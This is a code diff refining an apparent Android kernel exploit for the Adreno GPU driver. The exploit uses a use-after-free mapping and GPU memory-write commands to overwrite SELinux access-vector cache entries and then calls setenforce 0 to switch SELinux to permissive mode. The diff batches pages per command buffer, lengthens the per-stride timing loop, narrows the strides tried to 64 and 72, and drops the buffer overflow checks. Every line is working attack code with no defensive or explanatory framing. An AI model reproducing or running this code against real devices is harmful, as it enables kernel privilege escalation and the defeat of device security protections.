@@ -80,7 +80,8 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
 #define AVC_ENFORCE_PATH "/sys/fs/selinux/enforce"
-#define AVC_LOOP_PER_STRIDE 30
+#define AVC_PAGES_PER_IB 12
+#define AVC_LOOP_PER_STRIDE 60
 #define SPRAY_PIDS 2000
 #define CHURN_MAX_PATHS 20000
 
@@ -365,79 +366,71 @@ static int scan_flip_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
                            uint64_t *vas, int npages, int stride, int verbose) {
     uint32_t *cmd = (uint32_t *)ib_m;
     uint32_t *data = (uint32_t *)dst_m;
-    int total_flips = 0;
+    int total_flips = 0, idx = 0;
     unsigned int ts;
-
     int nodes_per_page = 4096 / stride;
-    if (nodes_per_page == 0 || nodes_per_page > 512) return 0;
+    if (nodes_per_page == 0) return 0;
 
-    for (int idx = 0; idx < npages; idx++) {
-        int batch = 1;
+    while (idx < npages) {
+        int batch = npages - idx;
+        if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
         int node_dws = batch * nodes_per_page * 4;
         memset(ib_m, 0, 0x10000);
         memset(dst_m, 0, node_dws * 4);
         int dw = 0;
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        uint64_t va = vas[idx];
-        for (int n = 0; n < nodes_per_page; n++) {
-            uint64_t node_va = va + n * stride;
-            uint32_t dofs = n * 4;
-            for (int w = 0; w < 4; w++) {
-                uint32_t dl, dh, sl, sh;
-                split64(dst_ga + (dofs + w) * 4, &dl, &dh);
-                split64(node_va + w * 4, &sl, &sh);
-                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-                cmd[dw++] = sl; cmd[dw++] = sh;
+        for (int p = 0; p < batch; p++) {
+            uint64_t va = vas[idx + p];
+            for (int n = 0; n < nodes_per_page; n++) {
+                uint64_t node_va = va + n * stride;
+                uint32_t dofs = (p * nodes_per_page + n) * 4;
+                for (int w = 0; w < 4; w++) {
+                    uint32_t dl, dh, sl, sh;
+                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
+                    split64(node_va + w * 4, &sl, &sh);
+                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                    cmd[dw++] = sl; cmd[dw++] = sh;
+                }
             }
         }
         cmd[dw++] = cp_type7(CP_NOP, 0);
-        if (dw * 4 > 0x10000) {
-            printf("[-] Read IB overflow at stride=%d\n", stride);
-            return total_flips;
-        }
         __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) {
-            printf("[-] submit read failed stride=%d\n", stride);
-            break;
-        }
-        if (wait_timestamp(ctx_id, ts) < 0) {
-            printf("[-] wait read failed stride=%d\n", stride);
-            break;
-        }
+        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(ctx_id, ts) < 0) break;
         __sync_synchronize();
 
         int fdw = 0, nb_flips = 0;
         uint32_t *fcmd = (uint32_t *)ib_m;
         fcmd[fdw++] = cp_type7(CP_NOP, 0);
-        for (int n = 0; n < nodes_per_page; n++) {
-            uint32_t *nd = &data[n * 4];
-            if (nd[0] >= 1 && nd[0] <= 0x3fff && nd[1] == 2 && nd[2] == 1) {
-                uint64_t node_va = va + n * stride + 0xc;
-                uint32_t sl, sh;
-                split64(node_va, &sl, &sh);
-                fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
-                fcmd[fdw++] = sl; fcmd[fdw++] = sh;
-                fcmd[fdw++] = 0xffffffff;
-                fcmd[fdw++] = 0;
-                nb_flips++;
-                if (verbose)
-                    printf("[FLIP] stride=%d va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
-                        stride, (unsigned long)va, n * stride + 0xc,
-                        nd[0], nd[1]);
+        for (int p = 0; p < batch; p++) {
+            uint64_t va = vas[idx + p];
+            for (int n = 0; n < nodes_per_page; n++) {
+                uint32_t *nd = &data[(p * nodes_per_page + n) * 4];
+                if (nd[0] >= 1 && nd[0] <= 0x3fff && nd[1] == 2 && nd[2] == 1) {
+                    uint64_t node_va = va + n * stride + 0xc;
+                    uint32_t sl, sh;
+                    split64(node_va, &sl, &sh);
+                    fcmd[fdw++] = cp_type7(CP_MEM_WRITE, 4);
+                    fcmd[fdw++] = sl; fcmd[fdw++] = sh;
+                    fcmd[fdw++] = 0xffffffff;
+                    fcmd[fdw++] = 0;
+                    nb_flips++;
+                    if (verbose)
+                        printf("[FLIP] stride=%d va=0x%lx+0x%x sid=0x%x ts=0x%x allowed->0xffffffff\n",
+                            stride, (unsigned long)va, n * stride + 0xc,
+                            nd[0], nd[1]);
+                }
             }
         }
         if (nb_flips > 0) {
             fcmd[fdw++] = cp_type7(CP_NOP, 0);
-            if (fdw * 4 > 0x10000) {
-                printf("[-] Write IB overflow at stride=%d\n", stride);
-                return total_flips;
-            }
             __sync_synchronize();
             if (submit_ib(ctx_id, ib_ga, fdw*4, ib_id, &ts) == 0)
                 wait_timestamp(ctx_id, ts);
         }
         total_flips += nb_flips;
+        idx += batch;
     }
     return total_flips;
 }
@@ -495,17 +488,23 @@ static int run_stride(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
     printf("[*] Trying stride=%d for %d seconds\n", stride, AVC_LOOP_PER_STRIDE);
     while (!ok && time(NULL) - t_start < AVC_LOOP_PER_STRIDE) {
         int f1 = 0, f2 = 0;
-        for (int i = 0; i < n_task_pgs; i++) {
+        for (int i = n_task_pgs - 1; i >= 0; i -= AVC_PAGES_PER_IB) {
+            int batch = (i + 1) >= AVC_PAGES_PER_IB ? AVC_PAGES_PER_IB : (i + 1);
             f1 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                  &task_pgs[i], 1, stride, 1);
+                                  &task_pgs[i - batch + 1], batch, stride, 1);
             if (try_setenforce0()) { ok = 1; break; }
         }
         if (!ok) {
             for (uint64_t va = UAF_ADDR + 0x2000;
                  va < UAF_ADDR + UAF_SIZE - 0x1000;
-                 va += 0x1000) {
+                 va += AVC_PAGES_PER_IB * 0x1000) {
+                uint64_t vas[AVC_PAGES_PER_IB];
+                int nb = 0;
+                for (int i = 0; i < AVC_PAGES_PER_IB &&
+                     va + (uint64_t)i * 0x1000 < UAF_ADDR + UAF_SIZE - 0x1000; i++)
+                    vas[nb++] = va + (uint64_t)i * 0x1000;
                 f2 += scan_flip_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
-                                      &va, 1, stride, 1);
+                                      vas, nb, stride, 1);
                 if (try_setenforce0()) { ok = 1; break; }
             }
         }
@@ -617,9 +616,7 @@ int main(int argc, char **argv) {
     for (int c = 0; c < 3; c++) churn_round();
     printf("[AVC] entries=%d (post-churn)\n", avc_entries());
 
-    int strides[] = {
-        8, 16, 24, 32, 40, 48, 56, 64, 72
-    };
+    int strides[] = {64, 72};
     int num_strides = sizeof(strides)/sizeof(strides[0]);
     int ok = 0;
     for (int si = 0; si < num_strides && !ok; si++) {
@@ -630,7 +627,7 @@ int main(int argc, char **argv) {
     if (ok) {
         printf("[+] ### SETENFORCE 0 SUCCEEDED — SELinux permissive ###\n");
     } else {
-        printf("[-] AVC bypass failed with all strides\n");
+        printf("[-] AVC bypass failed with strides 64 and 72\n");
     }
     {
         int fd = open("/sys/fs/selinux/enforce", O_RDONLY);
